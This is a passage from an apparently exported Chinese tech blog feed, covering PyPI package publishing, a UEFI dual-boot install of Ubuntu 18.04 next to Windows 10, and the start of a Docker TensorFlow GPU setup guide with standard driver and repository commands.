<h2 id="发布包"><a href="#发布包" class="headerlink" title="发布包"></a>发布包</h2><p>PyPI(Python Package Index) 是 Python 官方维护的第三方包仓库，用于统一存储和管理开发者发布的 Python 包。</p>
<p>如果要发布自己的包，需要先到 pypi 上注册账号。然后创建 ~&#x2F;.pypirc 文件，此文件中配置 PyPI 访问地址和账号。如的.pypirc文件内容请根据自己的账号来修改。</p>
<p>典型的 .pypirc 文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[distutils]</span><br><span class="line">index-servers = pypi</span><br><span class="line"></span><br><span class="line">[pypi]</span><br><span class="line">username:xxx</span><br><span class="line">password:xxx</span><br></pre></td></tr></table></figure>
<p>接着注册项目：</p>
<blockquote>
<p>python setup.py register</p>
</blockquote>
<p>该命令在 PyPi 上注册项目信息，成功注册之后，可以在 PyPi 上看到项目信息。最后构建源码包发布即可：</p>
<blockquote>
<p>python setup.py sdist upload</p>
</blockquote>
<p><a href="https://github.com/CKCat/Note/tree/master/Python/setups">例子</a></p>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>Python使用</tag>
      </tags>
  </entry>
  <entry>
    <title>UEFI模式Windows10上安装Ubuntu 18.04.1 LTS双系统</title>
    <url>/2019/11/08/UEFI%E6%A8%A1%E5%BC%8FWindows10%E4%B8%8A%E5%AE%89%E8%A3%85Ubuntu-18-04-1-LTS%E5%8F%8C%E7%B3%BB%E7%BB%9F/</url>
    <content><![CDATA[<blockquote>
<p>转载自：<a href="https://www.mzihen.com/how-to-install-ubuntu-18-04-lts-with-windows-10-on-uefi/">https://www.mzihen.com/how-to-install-ubuntu-18-04-lts-with-windows-10-on-uefi/</a></p>
</blockquote>
<!-- TOC -->

<ul>
<li><a href="#%E4%B8%80%E5%88%B6%E4%BD%9C%E6%94%AF%E6%8C%81uefi%E5%90%AF%E5%8A%A8%E7%9A%84ubuntu-usb%E5%90%AF%E5%8A%A8%E7%9B%98">一、制作支持UEFI启动的Ubuntu USB启动盘</a></li>
<li><a href="#%E4%BA%8Cwindows10%E4%B8%AD%E7%9A%84%E8%AE%BE%E7%BD%AE">二、Windows10中的设置</a></li>
<li><a href="#%E4%B8%89%E5%88%86%E5%8C%BA">三、分区</a></li>
<li><a href="#%E5%9B%9B%E5%AE%89%E8%A3%85ubuntu%E7%B3%BB%E7%BB%9F">四、安装Ubuntu系统</a></li>
<li><a href="#%E5%AD%98%E5%9C%A8%E7%9A%84%E9%97%AE%E9%A2%98">存在的问题。</a></li>
</ul>
<!-- /TOC -->
<h1 id="一、制作支持UEFI启动的Ubuntu-USB启动盘"><a href="#一、制作支持UEFI启动的Ubuntu-USB启动盘" class="headerlink" title="一、制作支持UEFI启动的Ubuntu USB启动盘"></a>一、制作支持UEFI启动的Ubuntu USB启动盘</h1><p>我使用了开源软件Rufus（<a href="https://rufus.akeo.ie/?locale=zh_CN">Rufus官网</a>）创建的USB启动盘，Ubuntu使用了最新版的Ubuntu 18.04.1 LTS（<a href="https://www.ubuntu.com/download/desktop">ubuntu官网</a>）。</p>
<p>现有台式机是SSD硬盘加机械硬盘，win10系统安装在SSD硬盘，SSD是MBR分区的，机械硬盘是GPT分区，主板使用的UEFI启动模式。因为要将Ubuntu安装在机械硬盘上，所以制作启动盘选择的 <strong>分区类型选择GPT，目标系统类型选择UEFI(非CSM)</strong> ，其它都按照我设置的即可，如下图。</p>
<img src="/2019/11/08/UEFI%E6%A8%A1%E5%BC%8FWindows10%E4%B8%8A%E5%AE%89%E8%A3%85Ubuntu-18-04-1-LTS%E5%8F%8C%E7%B3%BB%E7%BB%9F/2019-11-08-10-42-00.png" class="">

<p>需要注意的是，建议使用新版本的Ubuntu，因为低版本的Ubuntu不支持UEFI+GPT，比如Ubuntu16.04 386（32bit），而Ubuntu 18.04版本是64位的，支持UEFI+GPT。</p>
<h1 id="二、Windows10中的设置"><a href="#二、Windows10中的设置" class="headerlink" title="二、Windows10中的设置"></a>二、Windows10中的设置</h1><p>在“控制面板\硬件和声音\电源选项\系统设置”去掉勾选“启用快速启动（推荐）”</p>
<img src="/2019/11/08/UEFI%E6%A8%A1%E5%BC%8FWindows10%E4%B8%8A%E5%AE%89%E8%A3%85Ubuntu-18-04-1-LTS%E5%8F%8C%E7%B3%BB%E7%BB%9F/2019-11-08-10-45-27.png" class="">

<p>取消”启用快速启动(推荐)”的原因是： “快速启动”是Windows8时代引进的新特性，“快速启动”会影响Grub开机引导过程，可能出现无法载入Ubuntu的状况，最后选择“保存修改”。（<a href="https://www.jianshu.com/p/0ccf1778d8ae">点击浏览更多…</a>）</p>
<p>另外还要禁用主板上的“安全启动（Secure Boot）”，而我的主板B150-Plus安全启动是默认勾选且灰色不可修改的，便没有更改此项。但是可以选择Windows系统或者其它操作系统。</p>
<img src="/2019/11/08/UEFI%E6%A8%A1%E5%BC%8FWindows10%E4%B8%8A%E5%AE%89%E8%A3%85Ubuntu-18-04-1-LTS%E5%8F%8C%E7%B3%BB%E7%BB%9F/2019-11-08-10-46-16.png" class="">

<h1 id="三、分区"><a href="#三、分区" class="headerlink" title="三、分区"></a>三、分区</h1><p>准备工作：备份好数据。<br>使用软件DiskGenius（<a href="http://www.diskgenius.cn/">官网</a>）将机械硬盘第一个分区压缩出80G空闲区出来，网上有说30G就够了，具体看硬盘容量情况。</p>
<img src="/2019/11/08/UEFI%E6%A8%A1%E5%BC%8FWindows10%E4%B8%8A%E5%AE%89%E8%A3%85Ubuntu-18-04-1-LTS%E5%8F%8C%E7%B3%BB%E7%BB%9F/2019-11-08-10-47-09.png" class="">

<h1 id="四、安装Ubuntu系统"><a href="#四、安装Ubuntu系统" class="headerlink" title="四、安装Ubuntu系统"></a>四、安装Ubuntu系统</h1><p>进入BIOS，设置boot启动选项，选择从U盘启动，或者第一启动盘为U盘，保存并退出。<br>进入Ubuntu安装界面，有提示试用还是安装。我先进入了试用界面，然后在试用界面里选择的安装。</p>
<p>选择好语言，点击继续。</p>
<img src="/2019/11/08/UEFI%E6%A8%A1%E5%BC%8FWindows10%E4%B8%8A%E5%AE%89%E8%A3%85Ubuntu-18-04-1-LTS%E5%8F%8C%E7%B3%BB%E7%BB%9F/2019-11-08-10-47-43.png" class="">

<p>选择好键盘布局，点击继续。</p>
<img src="/2019/11/08/UEFI%E6%A8%A1%E5%BC%8FWindows10%E4%B8%8A%E5%AE%89%E8%A3%85Ubuntu-18-04-1-LTS%E5%8F%8C%E7%B3%BB%E7%BB%9F/2019-11-08-10-48-11.png" class="">

<p>这里选择“正常安装”，在其他选项中，如果网络不好或者想安装速度快一些，不勾选“安装 Ubuntu时下载更新”。</p>
<img src="/2019/11/08/UEFI%E6%A8%A1%E5%BC%8FWindows10%E4%B8%8A%E5%AE%89%E8%A3%85Ubuntu-18-04-1-LTS%E5%8F%8C%E7%B3%BB%E7%BB%9F/2019-11-08-10-48-42.png" class="">

<p>因为是安装到指定盘里，并不是全新安装，也不希望清除掉硬盘里其它分区的数据，所以这里选择“其他选项”。</p>
<img src="/2019/11/08/UEFI%E6%A8%A1%E5%BC%8FWindows10%E4%B8%8A%E5%AE%89%E8%A3%85Ubuntu-18-04-1-LTS%E5%8F%8C%E7%B3%BB%E7%BB%9F/2019-11-08-10-51-09.png" class="">

<p>选择“其他选项”后，开始给硬盘进行分区。跟安装Windows类似，Windows会自动分成几个隐藏的区：450 MB恢复分区、100 MB系统分区和16 MB的MSR (保留)分区，Ubuntu略微不同，需要手动划分。</p>
<p>一般Linux设置4个分区：</p>
<blockquote>
<p>&#x2F; ：根分区，一般分8G就可以，如果磁盘空间足够，10G~16G也可以，甚至有人分了30G，这里最好选择30G。</p>
</blockquote>
<blockquote>
<p>swap ：交换空间，即虚拟内存，建议是你机器的物理内存小于1G的话虚拟内存设置为物理内存的2倍；如果物理内存大于1G，建议在物理内存的基础上加2G，最大不要超过两倍。我的物理内存是16g，只要20g足矣。因磁盘空间又够，所以分了32G。</p>
</blockquote>
<blockquote>
<p>&#x2F;boot ：启动分区，系统的启动文件，大小一般分200M。</p>
</blockquote>
<blockquote>
<p><del>efi ：EFI系统分区，系统的启动文件，大小一般分200M。</del></p>
</blockquote>
<blockquote>
<p>&#x2F;home ：home目录，文件分区，存放个人文件，分完其他所有区之后，剩下的空间全部给它即可。</p>
</blockquote>
<p>我第一次设置了&#x2F;boot分区而不是设置的efi分区，出现了错误：</p>
<blockquote>
<blockquote>
<p>在复制系统文件的时候出现了“无法将 grub-efi-amd64-signed 软件包安装到 &#x2F;target&#x2F;中。如果没有 GRUB 启动引导器，所安装的系统将无法启动。”</p>
</blockquote>
</blockquote>
<p>重新安装了两次出现一样的错误结果。参考<a href="https://www.zhihu.com/question/36811339">知乎上这个答案后</a>，使用eif系统分区取代了boot分区，最后安装成功。后面截图有出现错误的地方</p>
<p>选择125G的空闲区（前文分了80G的空闲区，再加上其它的空闲区，有了125G多点），点击下面“+”号，添加&#x2F;分区，依次选择 大小10240MB（10GB）、主分区、空间起始位置，Ext4日志文件系统、挂载点&#x2F;，然后点击OK。</p>
<img src="/2019/11/08/UEFI%E6%A8%A1%E5%BC%8FWindows10%E4%B8%8A%E5%AE%89%E8%A3%85Ubuntu-18-04-1-LTS%E5%8F%8C%E7%B3%BB%E7%BB%9F/2019-11-08-10-56-30.png" class="">

<img src="/2019/11/08/UEFI%E6%A8%A1%E5%BC%8FWindows10%E4%B8%8A%E5%AE%89%E8%A3%85Ubuntu-18-04-1-LTS%E5%8F%8C%E7%B3%BB%E7%BB%9F/2019-11-08-10-57-03.png" class="">

<p>继续点击“+”号，添加swap分区（交换分区），大小填32768MB（32G），（如果你的物理内存是16G，建议此处填写20480MB（20G）），逻辑分区，空间起始位置，交换空间，点击OK。</p>
<img src="/2019/11/08/UEFI%E6%A8%A1%E5%BC%8FWindows10%E4%B8%8A%E5%AE%89%E8%A3%85Ubuntu-18-04-1-LTS%E5%8F%8C%E7%B3%BB%E7%BB%9F/2019-11-08-10-57-37.png" class="">

<p>点击“+”号，添加EFI系统分区，大小200MB，逻辑分区，空间起始位置，EFI系统分区，点击OK。</p>
<img src="/2019/11/08/UEFI%E6%A8%A1%E5%BC%8FWindows10%E4%B8%8A%E5%AE%89%E8%A3%85Ubuntu-18-04-1-LTS%E5%8F%8C%E7%B3%BB%E7%BB%9F/2019-11-08-10-58-00.png" class="">

<p>点击“+”号，添加&#x2F;home分区，大小直接默认，也就是剩余的所有空间，逻辑分区，空间起始位置，挂载点选择&#x2F;home，点击OK。</p>
<img src="/2019/11/08/UEFI%E6%A8%A1%E5%BC%8FWindows10%E4%B8%8A%E5%AE%89%E8%A3%85Ubuntu-18-04-1-LTS%E5%8F%8C%E7%B3%BB%E7%BB%9F/2019-11-08-10-58-27.png" class="">

<p>注意最下面的“安装启动引导器的设备”，要选择跟efi一致，选择好后点击现在安装。</p>
<img src="/2019/11/08/UEFI%E6%A8%A1%E5%BC%8FWindows10%E4%B8%8A%E5%AE%89%E8%A3%85Ubuntu-18-04-1-LTS%E5%8F%8C%E7%B3%BB%E7%BB%9F/2019-11-08-10-58-57.png" class="">

<p>接下来就提示哪些分区被会操作。</p>
<img src="/2019/11/08/UEFI%E6%A8%A1%E5%BC%8FWindows10%E4%B8%8A%E5%AE%89%E8%A3%85Ubuntu-18-04-1-LTS%E5%8F%8C%E7%B3%BB%E7%BB%9F/2019-11-08-10-59-17.png" class="">

<p>你在什么地方，选择shanghai，也可依据自己需要选择其它地区。</p>
<img src="/2019/11/08/UEFI%E6%A8%A1%E5%BC%8FWindows10%E4%B8%8A%E5%AE%89%E8%A3%85Ubuntu-18-04-1-LTS%E5%8F%8C%E7%B3%BB%E7%BB%9F/2019-11-08-10-59-35.png" class="">

<p>填写用户名和密码。</p>
<img src="/2019/11/08/UEFI%E6%A8%A1%E5%BC%8FWindows10%E4%B8%8A%E5%AE%89%E8%A3%85Ubuntu-18-04-1-LTS%E5%8F%8C%E7%B3%BB%E7%BB%9F/2019-11-08-10-59-58.png" class="">

<p>接下来就静静等待安装即可。</p>
<img src="/2019/11/08/UEFI%E6%A8%A1%E5%BC%8FWindows10%E4%B8%8A%E5%AE%89%E8%A3%85Ubuntu-18-04-1-LTS%E5%8F%8C%E7%B3%BB%E7%BB%9F/2019-11-08-11-00-21.png" class="">

<p>下面一个截图是特地截取的，前几次安装都是失败在此处。前面有错误说明</p>
<img src="/2019/11/08/UEFI%E6%A8%A1%E5%BC%8FWindows10%E4%B8%8A%E5%AE%89%E8%A3%85Ubuntu-18-04-1-LTS%E5%8F%8C%E7%B3%BB%E7%BB%9F/2019-11-08-11-01-00.png" class="">

<p>安装成功。因为在试用界面安装的Ubuntu，所以会提示继续试用，还是重启。</p>
<img src="/2019/11/08/UEFI%E6%A8%A1%E5%BC%8FWindows10%E4%B8%8A%E5%AE%89%E8%A3%85Ubuntu-18-04-1-LTS%E5%8F%8C%E7%B3%BB%E7%BB%9F/2019-11-08-11-01-26.png" class="">

<p>重启，按住del键进入BIOS，将Ubuntu系统所在的硬盘拖到第一位，保存并退出，就会进入Ubuntu系统。</p>
<img src="/2019/11/08/UEFI%E6%A8%A1%E5%BC%8FWindows10%E4%B8%8A%E5%AE%89%E8%A3%85Ubuntu-18-04-1-LTS%E5%8F%8C%E7%B3%BB%E7%BB%9F/2019-11-08-11-01-54.png" class="">

<p>删掉分区，只设置了EFI系统分区，系统完全可以安装，且Windows10可见4个区分。</p>
<img src="/2019/11/08/UEFI%E6%A8%A1%E5%BC%8FWindows10%E4%B8%8A%E5%AE%89%E8%A3%85Ubuntu-18-04-1-LTS%E5%8F%8C%E7%B3%BB%E7%BB%9F/2019-11-08-11-02-17.png" class="">


<h1 id="存在的问题。"><a href="#存在的问题。" class="headerlink" title="存在的问题。"></a>存在的问题。</h1><p>1、Ubuntu 18.04.1 LTS下建 &#x2F;boot 和 分区是无效的，需要建EFI系统分区。</p>
<p>2、有人将启动引导向设置在wi10的启动引导分区里，而我是单独建了一个引导分区，导致的结果就是开机直接进入系统，如果要切换Window10系统，需要到BIOS里切换。</p>
<p>3、进入系统后经常死机，可能跟显卡驱动有关，可以去更新显卡驱动，选择（tested)。</p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>Ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu 18.4使用docker配置TensorFlow GPU环境</title>
    <url>/2019/11/09/Ubuntu-18-4%E4%BD%BF%E7%94%A8docker%E9%85%8D%E7%BD%AETensorFlow-GPU%E7%8E%AF%E5%A2%83/</url>
    <content><![CDATA[<!-- TOC -->

<ul>
<li><a href="#%E4%B8%80%E5%AE%89%E8%A3%85nvidia%E6%98%BE%E5%8D%A1%E9%A9%B1%E5%8A%A8">一、安装nvidia显卡驱动</a><ul>
<li><a href="#1-%E9%A6%96%E5%85%88%E5%B0%86ppagraphics-driversppa%E5%AD%98%E5%82%A8%E5%BA%93%E6%B7%BB%E5%8A%A0%E5%88%B0%E6%82%A8%E7%9A%84%E7%B3%BB%E7%BB%9F%E4%B8%AD">1. 首先，将ppa:graphics-drivers&#x2F;ppa存储库添加到您的系统中：</a></li>
<li><a href="#2-%E6%8E%A5%E4%B8%8B%E6%9D%A5%E7%A1%AE%E5%AE%9A%E6%82%A8%E7%9A%84%E5%9B%BE%E5%BD%A2%E5%8D%A1%E5%9E%8B%E5%8F%B7%E5%92%8C%E6%8E%A8%E8%8D%90%E7%9A%84%E9%A9%B1%E5%8A%A8%E7%A8%8B%E5%BA%8F">2. 接下来，确定您的图形卡型号和推荐的驱动程序：</a></li>
<li><a href="#3-%E4%B8%8E%E4%B8%8A%E9%9D%A2%E7%9A%84%E6%A0%87%E5%87%86ubuntu%E5%AD%98%E5%82%A8%E5%BA%93%E7%A4%BA%E4%BE%8B%E7%9B%B8%E5%90%8C%E5%8F%AF%E4%BB%A5%E8%87%AA%E5%8A%A8%E5%AE%89%E8%A3%85%E6%89%80%E6%9C%89%E6%8E%A8%E8%8D%90%E7%9A%84%E9%A9%B1%E5%8A%A8%E7%A8%8B%E5%BA%8F">3. 与上面的标准Ubuntu存储库示例相同，可以自动安装所有推荐的驱动程序：</a></li>
<li><a href="#4-%E5%AE%8C%E6%88%90%E5%90%8E%E9%87%8D%E6%96%B0%E5%90%AF%E5%8A%A8%E7%B3%BB%E7%BB%9F">4. 完成后，重新启动系统。</a></li>
</ul>
</li>
<li><a href="#%E4%BA%8C%E5%AE%89%E8%A3%85docker">二、安装docker</a><ul>
<li><a href="#1-%E8%AE%BE%E7%BD%AEdocker%E5%AD%98%E5%82%A8%E5%BA%93">1. 设置Docker存储库</a><ul>
<li><a href="#1-%E6%9B%B4%E6%96%B0apt%E5%8C%85%E7%B4%A2%E5%BC%95">1. 更新apt包索引：</a></li>
<li><a href="#2-%E5%AE%89%E8%A3%85%E8%BD%AF%E4%BB%B6%E5%8C%85%E4%BB%A5%E5%85%81%E8%AE%B8apt%E9%80%9A%E8%BF%87https%E4%BD%BF%E7%94%A8%E5%AD%98%E5%82%A8%E5%BA%93">2. 安装软件包以允许apt通过HTTPS使用存储库：</a></li>
<li><a href="#3-%E6%B7%BB%E5%8A%A0docker%E7%9A%84%E5%AE%98%E6%96%B9gpg%E5%AF%86%E9%92%A5">3. 添加Docker的官方GPG密钥：</a></li>
<li><a href="#4-%E4%BD%BF%E7%94%A8%E4%BB%A5%E4%B8%8B%E5%91%BD%E4%BB%A4%E6%9D%A5%E8%AE%BE%E7%BD%AE%E7%A8%B3%E5%AE%9A%E7%9A%84%E5%AD%98%E5%82%A8%E5%BA%93">4. 使用以下命令来设置稳定的存储库。</a></li>
</ul>
</li>
<li><a href="#2-%E5%AE%89%E8%A3%85docker-engine-%E7%A4%BE%E5%8C%BA">2. 安装DOCKER ENGINE-社区</a><ul>
<li><a href="#1-%E6%9B%B4%E6%96%B0apt%E5%8C%85%E7%B4%A2%E5%BC%95-1">1. 更新apt包索引。</a></li>
<li><a href="#2-%E5%AE%89%E8%A3%85%E6%9C%80%E6%96%B0%E7%89%88%E6%9C%AC%E7%9A%84docker-engine-community%E5%92%8Ccontainerd%E6%88%96%E8%80%85%E8%BD%AC%E5%88%B0%E4%B8%8B%E4%B8%80%E6%AD%A5%E5%AE%89%E8%A3%85%E7%89%B9%E5%AE%9A%E7%89%88%E6%9C%AC">2. 安装最新版本的Docker Engine-Community和containerd，或者转到下一步安装特定版本：</a></li>
<li><a href="#3-%E8%A6%81%E5%AE%89%E8%A3%85%E7%89%B9%E5%AE%9A%E7%89%88%E6%9C%AC%E7%9A%84docker-engine-community%E8%AF%B7%E5%9C%A8%E5%AD%98%E5%82%A8%E5%BA%93%E4%B8%AD%E5%88%97%E5%87%BA%E5%8F%AF%E7%94%A8%E7%89%88%E6%9C%AC%E7%84%B6%E5%90%8E%E9%80%89%E6%8B%A9%E5%B9%B6%E5%AE%89%E8%A3%85">3. 要安装特定版本的Docker Engine-Community，请在存储库中列出可用版本，然后选择并安装：</a></li>
<li><a href="#4-%E9%80%9A%E8%BF%87%E8%BF%90%E8%A1%8Chello-world-%E6%98%A0%E5%83%8F%E6%9D%A5%E9%AA%8C%E8%AF%81%E6%98%AF%E5%90%A6%E6%AD%A3%E7%A1%AE%E5%AE%89%E8%A3%85%E4%BA%86docker-engine-community-">4. 通过运行hello-world 映像来验证是否正确安装了Docker Engine-Community 。</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#%E4%B8%89nvidia-docker%E5%92%8Cnvidia-container-runtime%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE">三、<code>nvidia-docker</code>和<code>nvidia-container-runtime</code>安装和配置</a><ul>
<li><a href="#1-%E5%AE%89%E8%A3%85nvidia-docker-">1. 安装<code>nvidia-docker</code> 。</a></li>
<li><a href="#2-%E5%AE%89%E8%A3%85nvidia-container-runtime">2. 安装nvidia-container-runtime</a></li>
<li><a href="#3-docker%E5%BC%95%E6%93%8E%E9%85%8D%E7%BD%AE">3. Docker引擎配置</a><ul>
<li><a href="#1-systemd-drop-in-file">1. Systemd drop-in file</a></li>
<li><a href="#2-daemon-configuration-file">2. Daemon configuration file</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#%E5%9B%9B%E9%85%8D%E7%BD%AEtensorflow">四、配置tensorflow</a><ul>
<li><a href="#1-%E9%AA%8C%E8%AF%81-nvidia-docker-%E5%AE%89%E8%A3%85">1. 验证 nvidia-docker 安装</a></li>
<li><a href="#2-%E4%B8%8B%E8%BD%BD%E5%B9%B6%E8%BF%90%E8%A1%8C%E6%94%AF%E6%8C%81-gpu-%E7%9A%84-tensorflow-%E6%98%A0%E5%83%8F">2. 下载并运行支持 <code>GPU</code> 的 <code>TensorFlow</code> 映像</a><ul>
<li><a href="#1-%E4%B8%8B%E8%BD%BD%E6%94%AF%E6%8C%81-gpu-%E7%9A%84-tensorflow-%E6%98%A0%E5%83%8F">1. 下载支持 <code>GPU</code> 的 <code>TensorFlow</code> 映像</a></li>
<li><a href="#2-%E7%8E%AF%E5%A2%83%E6%B5%8B%E8%AF%95">2. 环境测试</a></li>
<li><a href="#3-%E4%BD%BF%E7%94%A8%E6%9C%80%E6%96%B0%E7%9A%84-tensorflow-gpu-%E6%98%A0%E5%83%8F%E5%9C%A8%E5%AE%B9%E5%99%A8%E4%B8%AD%E5%90%AF%E5%8A%A8-bash-shell-%E4%BC%9A%E8%AF%9D">3. 使用最新的 TensorFlow GPU 映像在容器中启动 bash shell 会话</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#%E4%BA%94%E9%80%9A%E8%BF%87%E8%BD%AF%E9%93%BE%E6%8E%A5%E4%BF%AE%E6%94%B9docker%E9%85%8D%E7%BD%AE%E6%9C%AC%E5%9C%B0%E9%95%9C%E5%83%8F%E4%B8%8E%E5%AE%B9%E5%99%A8%E7%9A%84%E5%AD%98%E5%82%A8%E4%BD%8D%E7%BD%AE">五、通过软链接修改Docker配置本地镜像与容器的存储位置</a></li>
<li><a href="#%E5%85%AD%E4%BD%BF%E7%94%A8%E9%9D%9Eroot%E7%94%A8%E6%88%B7%E8%BF%90%E8%A1%8Cdocker">六、使用非root用户运行docker</a></li>
</ul>
<!-- /TOC -->
<h1 id="一、安装nvidia显卡驱动"><a href="#一、安装nvidia显卡驱动" class="headerlink" title="一、安装nvidia显卡驱动"></a>一、安装nvidia显卡驱动</h1><h2 id="1-首先，将ppa-graphics-drivers-x2F-ppa存储库添加到您的系统中："><a href="#1-首先，将ppa-graphics-drivers-x2F-ppa存储库添加到您的系统中：" class="headerlink" title="1. 首先，将ppa:graphics-drivers&#x2F;ppa存储库添加到您的系统中："></a>1. 首先，将ppa:graphics-drivers&#x2F;ppa存储库添加到您的系统中：</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo add-apt-repository ppa:graphics-drivers/ppa</span><br><span class="line">$ sudo apt update</span><br></pre></td></tr></table></figure>

<h2 id="2-接下来，确定您的图形卡型号和推荐的驱动程序："><a href="#2-接下来，确定您的图形卡型号和推荐的驱动程序：" class="headerlink" title="2. 接下来，确定您的图形卡型号和推荐的驱动程序："></a>2. 接下来，确定您的图形卡型号和推荐的驱动程序：</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ubuntu-drivers devices</span><br><span class="line">== /sys/devices/pci0000:00/0000:00:01.0/0000:01:00.0 ==</span><br><span class="line">modalias : pci:v000010DEd00001C8Csv00001558sd000055A1bc03sc00i00</span><br><span class="line">vendor   : NVIDIA Corporation</span><br><span class="line">model    : GP107M [GeForce GTX 1050 Ti Mobile]</span><br><span class="line">driver   : nvidia-driver-415 - third-party free</span><br><span class="line">driver   : nvidia-driver-390 - third-party free</span><br><span class="line">driver   : nvidia-driver-440 - third-party free recommended</span><br><span class="line">driver   : nvidia-driver-430 - distro non-free</span><br><span class="line">driver   : nvidia-driver-410 - third-party free</span><br><span class="line">driver   : nvidia-driver-435 - distro non-free</span><br><span class="line">driver   : xserver-xorg-video-nouveau - distro free <span class="built_in">builtin</span></span><br></pre></td></tr></table></figure>

<h2 id="3-与上面的标准Ubuntu存储库示例相同，可以自动安装所有推荐的驱动程序："><a href="#3-与上面的标准Ubuntu存储库示例相同，可以自动安装所有推荐的驱动程序：" class="headerlink" title="3. 与上面的标准Ubuntu存储库示例相同，可以自动安装所有推荐的驱动程序："></a>3. 与上面的标准Ubuntu存储库示例相同，可以自动安装所有推荐的驱动程序：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo ubuntu-drivers autoinstall</span><br></pre></td></tr></table></figure>
<p>或选择性地使用<code>apt</code>命令。例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo apt install nvidia-410</span><br></pre></td></tr></table></figure>
<h2 id="4-完成后，重新启动系统。"><a href="#4-完成后，重新启动系统。" class="headerlink" title="4. 完成后，重新启动系统。"></a>4. 完成后，重新启动系统。</h2><p>使用<code>nvidia-smi</code>查看显卡信息：</p>
<img src="/2019/11/09/Ubuntu-18-4%E4%BD%BF%E7%94%A8docker%E9%85%8D%E7%BD%AETensorFlow-GPU%E7%8E%AF%E5%A2%83/2019-11-09-17-06-46.png" class="">

<blockquote>
<p>参考连接：<a href="https://linuxconfig.org/how-to-install-the-nvidia-drivers-on-ubuntu-18-04-bionic-beaver-linux">https://linuxconfig.org/how-to-install-the-nvidia-drivers-on-ubuntu-18-04-bionic-beaver-linux</a></p>
</blockquote>
<h1 id="二、安装docker"><a href="#二、安装docker" class="headerlink" title="二、安装docker"></a>二、安装docker</h1><h2 id="1-设置Docker存储库"><a href="#1-设置Docker存储库" class="headerlink" title="1. 设置Docker存储库"></a>1. 设置Docker存储库</h2><h3 id="1-更新apt包索引："><a href="#1-更新apt包索引：" class="headerlink" title="1. 更新apt包索引："></a>1. 更新apt包索引：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo apt-get update</span><br></pre></td></tr></table></figure>

<h3 id="2-安装软件包以允许apt通过HTTPS使用存储库："><a href="#2-安装软件包以允许apt通过HTTPS使用存储库：" class="headerlink" title="2. 安装软件包以允许apt通过HTTPS使用存储库："></a>2. 安装软件包以允许apt通过HTTPS使用存储库：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo apt-get install \</span><br><span class="line">    apt-transport-https \</span><br><span class="line">    ca-certificates \</span><br><span class="line">    curl \</span><br><span class="line">    gnupg-agent \</span><br><span class="line">    software-properties-common</span><br></pre></td></tr></table></figure>

<h3 id="3-添加Docker的官方GPG密钥："><a href="#3-添加Docker的官方GPG密钥：" class="headerlink" title="3. 添加Docker的官方GPG密钥："></a>3. 添加Docker的官方GPG密钥：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -</span><br></pre></td></tr></table></figure>
<p>通过搜索指纹的后8个字符，验证您现在是否拥有带有指纹的密钥 <code>9DC8 5822 9FC7 DD38 854A E2D8 8D81 803C 0EBF CD88</code>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo apt-key fingerprint 0EBFCD88</span><br><span class="line">    </span><br><span class="line">pub   rsa4096 2017-02-22 [SCEA]</span><br><span class="line">      9DC8 5822 9FC7 DD38 854A  E2D8 8D81 803C 0EBF CD88</span><br><span class="line">uid           [ unknown] Docker Release (CE deb) &lt;docker@docker.com&gt;</span><br><span class="line">sub   rsa4096 2017-02-22 [S]</span><br></pre></td></tr></table></figure>

<h3 id="4-使用以下命令来设置稳定的存储库。"><a href="#4-使用以下命令来设置稳定的存储库。" class="headerlink" title="4. 使用以下命令来设置稳定的存储库。"></a>4. 使用以下命令来设置稳定的存储库。</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo add-apt-repository \</span><br><span class="line">   &quot;deb [arch=amd64] https://download.docker.com/linux/ubuntu \</span><br><span class="line">   $(lsb_release -cs) \</span><br><span class="line">   stable&quot;</span><br></pre></td></tr></table></figure>

<h2 id="2-安装DOCKER-ENGINE-社区"><a href="#2-安装DOCKER-ENGINE-社区" class="headerlink" title="2. 安装DOCKER ENGINE-社区"></a>2. 安装DOCKER ENGINE-社区</h2><h3 id="1-更新apt包索引。"><a href="#1-更新apt包索引。" class="headerlink" title="1. 更新apt包索引。"></a>1. 更新apt包索引。</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo apt-get update</span><br></pre></td></tr></table></figure>

<h3 id="2-安装最新版本的Docker-Engine-Community和containerd，或者转到下一步安装特定版本："><a href="#2-安装最新版本的Docker-Engine-Community和containerd，或者转到下一步安装特定版本：" class="headerlink" title="2. 安装最新版本的Docker Engine-Community和containerd，或者转到下一步安装特定版本："></a>2. 安装最新版本的Docker Engine-Community和containerd，或者转到下一步安装特定版本：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo apt-get install docker-ce docker-ce-cli containerd.io</span><br></pre></td></tr></table></figure>

<h3 id="3-要安装特定版本的Docker-Engine-Community，请在存储库中列出可用版本，然后选择并安装："><a href="#3-要安装特定版本的Docker-Engine-Community，请在存储库中列出可用版本，然后选择并安装：" class="headerlink" title="3. 要安装特定版本的Docker Engine-Community，请在存储库中列出可用版本，然后选择并安装："></a>3. 要安装特定版本的Docker Engine-Community，请在存储库中列出可用版本，然后选择并安装：</h3><ul>
<li><p>列出您的仓库中可用的版本：</p>
